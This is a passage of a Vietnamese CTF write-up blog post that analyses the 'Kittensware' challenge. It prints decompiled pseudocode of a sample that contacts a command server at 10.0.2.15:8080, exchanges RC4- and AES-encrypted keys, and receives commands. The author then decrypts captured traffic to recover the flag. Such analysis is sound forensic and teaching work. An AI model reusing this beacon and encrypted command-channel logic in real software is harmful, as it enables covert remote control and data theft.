class="comment">// rbx</span></span><br><span class="line">  __int64 v8; <span class="comment">// rax</span></span><br><span class="line">  __int64 v9; <span class="comment">// rsi</span></span><br><span class="line">  __int64 v10; <span class="comment">// rax</span></span><br><span class="line">  __int64 v11; <span class="comment">// r13</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v13; <span class="comment">// [rsp+44h] [rbp-1444h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v14; <span class="comment">// [rsp+48h] [rbp-1440h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// [rsp+4Ch] [rbp-143Ch] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v16[<span class="number">1024</span>]; <span class="comment">// [rsp+50h] [rbp-1438h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v17[<span class="number">4152</span>]; <span class="comment">// [rsp+450h] [rbp-1038h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="built_in">calloc</span>(<span class="number">3000</span>, <span class="number">1</span>);</span><br><span class="line">  v13 = <span class="number">0</span>;</span><br><span class="line">  v14 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v16, <span class="number">0</span>, <span class="number">1024</span>);</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v17, <span class="number">0</span>, <span class="number">4096</span>);</span><br><span class="line">  v15 = <span class="number">1024</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !ObtainUserAgentString(<span class="number">0</span>, v16, &amp;v15) )</span><br><span class="line">  &#123;</span><br><span class="line">    mbstowcs(v17, v16, <span class="number">1024</span>);</span><br><span class="line">    v6 = WinHttpOpen(v17, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x10000000</span>);</span><br><span class="line">    v7 = v6;</span><br><span class="line">    <span class="keyword">if</span> ( v6 )</span><br><span class="line">    &#123;</span><br><span class="line">      v8 = WinHttpConnect(v6, <span class="string">L&quot;10.0.2.15&quot;</span>, <span class="number">8080</span>, <span class="number">0</span>);</span><br><span class="line">      v9 = v8;</span><br><span class="line">      <span class="keyword">if</span> ( v8 )</span><br><span class="line">      &#123;</span><br><span class="line">        v10 = WinHttpOpenRequest(v8, <span class="number">0</span>, a1, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        v11 = v10;</span><br><span class="line">        <span class="keyword">if</span> ( v10 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( WinHttpSendRequest(v10, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">200</span>, <span class="number">0</span>) &amp;&amp; WinHttpReceiveResponse(v11, <span class="number">0</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">            WinHttpQueryDataAvailable(v11, &amp;v13);</span><br><span class="line">            v5 = <span class="number">1</span>;</span><br><span class="line">            WinHttpReadData(v11, v4, v13, &amp;v14);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            v5 = <span class="number">0</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          WinHttpCloseHandle(v11);</span><br><span class="line">        &#125;</span><br><span class="line">        WinHttpCloseHandle(v9);</span><br><span class="line">      &#125;</span><br><span class="line">      WinHttpCloseHandle(v7);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memcpy</span>(a2, v4, v14);</span><br><span class="line">    a2[v14] = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Như vậy trong phần khởi tạo sẽ gọi đến <code>/key</code> để request server -&gt; lưu 2048 bytes trả về vào trong <code>v70</code>.</p>
<p>Sau đó chương trình sẽ decode base64 <code>v70</code> -&gt; <code>v4</code>. Từ <code>v4</code> parse json vào <code>v6</code>, và đoán là sẽ lấy object có key <code>v70</code>, lưu vào <code>v61[0]</code>.</p>
<p>Để xác thực, dump GET Request <code>/key</code> từ Wireshark và decode base64 ta được:</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;token&quot;</span>: <span class="string">&quot;ce537007fc0c1f1b42680e74d2658ab100bef36a43d8afaac4ece4702fb1610f&quot;</span>, <span class="attr">&quot;key&quot;</span>: <span class="string">&quot;yuaNTDdgYR3cJIQcpnSfe6fXlWKMUmZxFzD0xWKVjNXWPYlShZVL+zg9TOnFkWBeoK03bp7i+WZCVZDflzzc3A==&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<p>-&gt; Xác thực giả thiết và <code>v61[0]</code> sẽ chứa <code>key</code> ở dạng base64!</p>
<h4 id="Tao-khoa-cong-khai-voi-RC4"><a href="#Tao-khoa-cong-khai-voi-RC4" class="headerlink" title="Tạo khoá công khai với RC4"></a>Tạo khoá công khai với RC4</h4><p>Khúc này ban đầu mình cũng khá là đau đầu :)) hàm <code>text_68</code> sau khi inspect sẽ biết được nó là <code>vsprintf</code>, vậy mà tham số truyền vào lại là mấy chuỗi tiếng Tàu… vậy thì đống data xử lý như thế nào &lt;(“).</p>
<p>Khoảng vài phút sau mới nhận ra thực ra là lỗi bên IDA :)) VMProtect đổi mấy hàm <code>strcpy</code> thành <code>wcscpy</code> để anti static analysis, thành ra IDA sẽ luôn nhận tham số thứ 2 là chuỗi Unicode, thay vì là chuỗi ascii (1 ký tự Unicode được ghép từ 2 hay nhiều bytes lại với nhau, trong khi ascii chỉ cần 1 byte để biểu diễn)</p>
<p>Quick fix cho vấn đề này thì phải tab qua lại với bên assembly để lấy số ban đầu, sau đó decode sang chuỗi little endian… Chú ý: cách này mình dùng trong lúc thi thôi do thời gian gấp rút, còn cho đơn giản thì có thể dùng cyberchef như sau</p>
<p><img src="/images/wannagame-2022_2022-12-17-23-58-04.png"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">v9 = key;</span><br><span class="line">v61[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">v10 = iv;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  v11 = rand();</span><br><span class="line">  v12 = v11;</span><br><span class="line">  wcscpy(v74, <span class="string">L&quot;〥報&quot;</span>); <span class="comment">// %01X -&gt; Để in hex</span></span><br><span class="line">  text_68(v9, v74, (v11 &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0xF</span>);</span><br><span class="line">  wcscpy(v74, <span class="string">L&quot;〥報&quot;</span>); <span class="comment">// %01X</span></span><br><span class="line">  text_68(v9 + <span class="number">1</span>, v74, v12 &amp; <span class="number">0xF</span>);</span><br><span class="line">  v13 = rand();</span><br><span class="line">  v14 = v13;</span><br><span class="line">  wcscpy(v74, <span class="string">L&quot;〥報&quot;</span>); <span class="comment">// %01X</span></span><br><span class="line">  text_68(v10, v74, (v13 &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0xF</span>);</span><br><span class="line">  v9 += <span class="number">2</span>;</span><br><span class="line">  wcscpy(v74, <span class="string">L&quot;〥報&quot;</span>); <span class="comment">// %01X</span></span><br><span class="line">  v15 = v10 + <span class="number">1</span>;</span><br><span class="line">  v10 += <span class="number">2</span>;</span><br><span class="line">  text_68(v15, v74, v14 &amp; <span class="number">0xF</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( v9 != &amp;key[<span class="number">32</span>] ); <span class="comment">// Tạo random 1 số và convert sang hex nối vào key (v9), tương tự với IV (v10)</span></span><br><span class="line">mem_concat(key, <span class="number">32</span>, iv, <span class="number">32</span>, v65); <span class="comment">// Nối: v65 = key + iv, mỗi chuỗi độ dài là 32 bytes -&gt; size Key với IV là 16</span></span><br><span class="line"><span class="built_in">memset</span>(v72, <span class="number">0</span>, <span class="number">2048</span>);</span><br><span class="line">wmemcpy(v74, <span class="string">L&quot;ᕍ䭈䵓䥝ᵛ慺䍠&quot;</span>, <span class="number">7</span>); <span class="comment">// \x4d\x15\x48\x4b\x53\x4d\x5d\x49\x5b\x1d\x7a\x61\x60\x43</span></span><br><span class="line">v16 = v74;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  *v16 ^= <span class="number">54</span> - v74 + v16; <span class="comment">// Tối giản thành *v16 ^= 54 + i -&gt; &#123;&quot;private&quot;: &quot;\x00</span></span><br><span class="line">  v16 = (v16 + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( (&amp;v75 + <span class="number">6</span>) != v16 );</span><br><span class="line">v17 = <span class="built_in">strlen</span>(v72);</span><br><span class="line">mem_concat(v72, v17, v74, <span class="number">13</span>, v72); <span class="comment">// v72 += v74</span></span><br><span class="line">v18 = <span class="built_in">strlen</span>(v72);</span><br><span class="line">mem_concat(v72, v18, v65, <span class="number">64</span>, v72); <span class="comment">// v72 += v65</span></span><br><span class="line">wmemcpy(v74, <span class="string">L&quot;ᬔᬘ告䥎Ԝ灠灰灰䜻&quot;</span>, <span class="number">9</span>); <span class="comment">// \x14\x1b\x18\x1b\x4a\x54\x4e\x49\x1c\x05\x60\x70\x70\x70\x70\x70\x3b\x47</span></span><br><span class="line">v19 = v74;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  *v19 ^= <span class="number">54</span> - v74 + v19; <span class="comment">// Tương tự -&gt; &quot;, &quot;port&quot;: 12345&#125;\x00</span></span><br><span class="line">  v19 = (v19 + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( v19 != (&amp;v76 + <span class="number">2</span>) );</span><br><span class="line">v20 = <span class="built_in">strlen</span>(v72);</span><br><span class="line">mem_concat(v72, v20, v74, <span class="number">17</span>, v72); <span class="comment">// v72 += v74</span></span><br><span class="line">v21 = <span class="built_in">strlen</span>(v72);</span><br><span class="line">rc4(v70, v61[<span class="number">0</span>], v72, v21, v71); <span class="comment">// Từ hàm RC4 trên https://gist.github.com/rverton/a44fc8ca67ab9ec32089,</span></span><br><span class="line"><span class="comment">// Thứ tự có thể là key -&gt; plain -&gt; cipher, suy ra là encrypt v72 với key là v61[0], hay key mà ta tìm được ở phần trước (thông qua request từ server), kết quả sẽ lưu ở v71</span></span><br><span class="line">v22 = <span class="built_in">strlen</span>(v72);</span><br><span class="line">v23 = <span class="built_in">strlen</span>(user_token);</span><br><span class="line">mem_concat(user_token, v23, v71, v22, v71); <span class="comment">// v71 = user_token + v71, user_token ở đây có thể là token ở phần trước, do đã bỏ qua việc xét tới hàm process_object</span></span><br><span class="line">v24 = <span class="built_in">strlen</span>(v72);</span><br><span class="line">v25 = v24 + <span class="built_in">strlen</span>(user_token);</span><br><span class="line">v26 = b64_encode(v71, v25); <span class="comment">// encode v71 -&gt; v26</span></span><br><span class="line">wcscpy(v74, <span class="string">L&quot;key&quot;</span>);</span><br><span class="line">v56 = v26;</span><br><span class="line"><span class="keyword">if</span> ( !post_request(v74, v26, <span class="number">0</span>) ) <span class="comment">// Gửi post request v26 lên server:</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br></pre></td></tr></table></figure>

<p>Với lượng thông tin ta biết được, cấu trúc của gói tin sẽ như sau:</p>
<p>Base64(TOKEN_FROM_SERVER + RC4(KEY_FROM_SERVER, JSON_OF_KEY_IV))</p>
<p>-&gt; Giải mã được như sau:</p>
<p><img src="/images/wannagame-2022_2022-12-18-00-33-32.png"></p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;private&quot;</span>: <span class="string">&quot;3A87C22F8F2500606FACB653F1F686BC94DC0CF2BA4F121A94FB432D59D53992&quot;</span>, <span class="attr">&quot;port&quot;</span>: <span class="number">12345</span>&#125;</span><br></pre></td></tr></table></figure>

<p>Tách làm đôi </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">KEY = 3A87C22F8F2500606FACB653F1F686BC, </span><br><span class="line">IV = 94DC0CF2BA4F121A94FB432D59D53992</span><br></pre></td></tr></table></figure>

<h4 id="Thiet-lap-ket-noi"><a href="#Thiet-lap-ket-noi" class="headerlink" title="Thiết lập kết nối"></a>Thiết lập kết nối</h4><p>Ở phần này thì thực ra chỉ cần để ý những dòng sau:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">AES_init_ctx_iv(v66, &amp;key_bytes, &amp;iv_bytes);</span><br><span class="line">AES_CBC_encrypt_buffer(v66);</span><br><span class="line">v32 = <span class="built_in">strlen</span>(user_token);</span><br><span class="line">mem_concat(user_token, v32, v72, v31, v72);</span><br><span class="line">v33 = <span class="built_in">strlen</span>(user_token);</span><br><span class="line">v34 = b64_encode(v72, v31 + v33);</span><br></pre></td></tr></table></figure>

<p>Hơn nữa hàm parse_json cũng sẽ được gọi khá nhiều -&gt; Chương trình đang thiết lập giao thức socket TCP bằng AES CBC với KEY và IV ở trên. Lúc mình làm ra khúc này thì còn 10p :)) nên phần sau đây sẽ lụi luôn &lt;(“), setup cyberchef với thông số thích hợp và lần lượt dump các tcp stream để check xem giao tiếp qua lại những gì (khúc này chắc ý định của tác giả sẽ là viết tool để decode conversation, nhưng hên là không có quá nhiều nên mình làm chay vẫn kịp giờ :)))</p>
<p>Nhìn sơ qua thì có vẻ chương trình đang thực hiện chạy lệnh gì đó, (maybe nhận lệnh đọc file từ server, sau đó gửi ngược lại ?). Cấu trúc gói tin của 2 bên cũng tương tự như trên:</p>
<p>Base64(USER_TOKEN + AES(KEY_FROM_SERVER, IV_FROM_SERVER, DATA))</p>
<p>Kết quả là đã tìm được ở tcp stream 20 :))</p>
<p><img src="/images/wannagame-2022_2022-12-18-00-45-40.png"></p>
<p>Phần UserToken mình làm biếng nên sẽ để chung rồi decrypt luôn, cũng không ảnh hưởng mấy tới kết quả :v</p>
<p><img src="/images/wannagame-2022_2022-12-18-00-46-06.png"></p>
<p><strong>flag</strong>: <code>n3tc4t_15_l15t3nIng_0n_p07t_8080</code></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Overview"><span class="toc-number">1.</span> <span class="toc-text">Overview</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Doi-loi-ve-trai-nghiem-thi"><span class="toc-number">1.1.</span> <span class="toc-text">Đôi lời về trải nghiệm thi:</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Write-ups"><span class="toc-number">2.</span> <span class="toc-text">Write ups</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-The-return-of-Anti-Debug"><span class="toc-number">2.1.</span> <span class="toc-text">1. The return of Anti Debug</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Danh-sach-cac-file"><span class="toc-number">2.1.1.</span> <span class="toc-text">Danh sách các file:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tong-quan"><span class="toc-number">2.1.2.</span> <span class="toc-text">Tổng quan:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Noi-chuong-trinh-bat-dau"><span class="toc-number">2.1.3.</span> <span class="toc-text">Nơi chương trình bắt đầu</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Khoi-phuc-bien"><span class="toc-number">2.1.4.</span> <span class="toc-text">Khôi phục biến</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Calling-convention-cdecl"><span class="toc-number">2.1.5.</span> <span class="toc-text">Calling convention __cdecl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Phan-tich-ham-main-thong-qua-tu-tao-pseudo-code"><span class="toc-number">2.1.6.</span> <span class="toc-text">Phân tích hàm main thông qua tự tạo pseudo-code</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lap-va-re-nhanh"><span class="toc-number">2.1.7.</span> <span class="toc-text">Lặp và rẽ nhánh</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ham-sus"><span class="toc-number">2.1.8.</span> <span class="toc-text">Hàm sus</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Huong-giai-quyet"><span class="toc-number">2.1.9.</span> <span class="toc-text">Hướng giải quyết</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-Baby-APK"><span class="toc-number">2.2.</span> <span class="toc-text">2. Baby APK</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Danh-sach-cac-file-1"><span class="toc-number">2.2.1.</span> <span class="toc-text">Danh sách các file:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tong-quan-1"><span class="toc-number">2.2.2.</span> <span class="toc-text">Tổng quan:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Decompile-voi-jadx"><span class="toc-number">2.2.3.</span> <span class="toc-text">Decompile với jadx</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Phan-tich-kernel-blob-bin"><span class="toc-number">2.2.4.</span> <span class="toc-text">Phân tích kernel_blob.bin</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-Memory"><span class="toc-number">2.3.</span> <span class="toc-text">3. Memory</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Danh-sach-cac-file-2"><span class="toc-number">2.3.1.</span> <span class="toc-text">Danh sách các file</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Too-Short-Didn%E2%80%99t-Read"><span class="toc-number">2.3.2.</span> <span class="toc-text">Too Short, Didn’t Read</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-Kittensware"><span class="toc-number">2.4.</span> <span class="toc-text">4. Kittensware</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Danh-sach-cac-file-3"><span class="toc-number">2.4.1.</span> <span class="toc-text">Danh sách các file:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tong-quan-2"><span class="toc-number">2.4.2.</span> <span class="toc-text">Tổng quan:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Suspected-binary-in-network-trafic"><span class="toc-number">2.4.3.</span> <span class="toc-text">Suspected binary in network trafic</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Phan-tich-bang-IDA"><span class="toc-number">2.4.4.</span> <span class="toc-text">Phân tích bằng IDA</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Khoi-tao"><span class="toc-number">2.4.4.1.</span> <span class="toc-text">Khởi tạo</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Tao-khoa-cong-khai-voi-RC4"><span class="toc-number">2.4.4.2.</span> <span class="toc-text">Tạo khoá công khai với RC4</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Thiet-lap-ket-noi"><span class="toc-number">2.4.4.3.</span> <span class="toc-text">Thiết lập kết nối</span></a></li></ol></li></ol></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://mekanican.github.io/2022/12/13/wannagame-2022/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://mekanican.github.io/2022/12/13/wannagame-2022/&text=Wannagame championship 2022 Writeups"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://mekanican.github.io/2022/12/13/wannagame-2022/&title=Wannagame championship 2022 Writeups"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://mekanican.github.io/2022/12/13/wannagame-2022/&is_video=false&description=Wannagame championship 2022 Writeups"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Wannagame championship 2022 Writeups&body=Check out this article: https://mekanican.github.io/2022/12/13/wannagame-2022/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://mekanican.github.io/2022/12/13/wannagame-2022/&title=Wannagame championship 2022 Writeups"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://mekanican.github.io/2022/12/13/wannagame-2022/&title=Wannagame championship 2022 Writeups"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://mekanican.github.io/2022/12/13/wannagame-2022/&title=Wannagame championship 2022 Writeups"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://mekanican.github.io/2022/12/13/wannagame-2022/&title=Wannagame championship 2022 Writeups"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://mekanican.github.io/2022/12/13/wannagame-2022/&name=Wannagame championship 2022 Writeups&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://mekanican.github.io/2022/12/13/wannagame-2022/&t=Wannagame championship 2022 Writeups"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2016-2022
    Nghia Vo
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->
 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->


</body>
</html>
